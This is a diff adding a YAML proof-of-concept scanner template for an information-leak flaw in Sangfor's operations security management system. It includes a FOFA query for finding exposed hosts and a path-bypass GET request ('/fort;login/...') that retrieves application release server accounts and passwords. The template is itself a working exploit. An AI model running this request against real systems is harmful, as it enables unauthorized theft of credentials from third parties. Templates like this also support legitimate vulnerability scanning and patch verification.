@@ -1,0 +1,16 @@
+id: poc-yaml-sangfor-osm-get-all-application-release-info-leak
+info:
+  name: 深信服运维安全管理系统 get_all_application_release 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 深信服运维安全管理系统
+  fofa: body="/fort/login" && header="FORTSESSIONID"
+requests:
+- method: GET
+  path: /fort;login/app/get_all_application_release
+  expression: status_code == 200 && contains(body,"\"fortApplicationAeleaseServers\":")
+    && contains(body,"\"fortApplicationReleaseServerAccount\":") && contains(body,"\"fortApplicationReleaseServerPassword\":")
+    && contains(body,"\"success\":\"success\"") && !contains(body,"<") && contains(content_type,"application/json")
+variables: {}
+transport: http
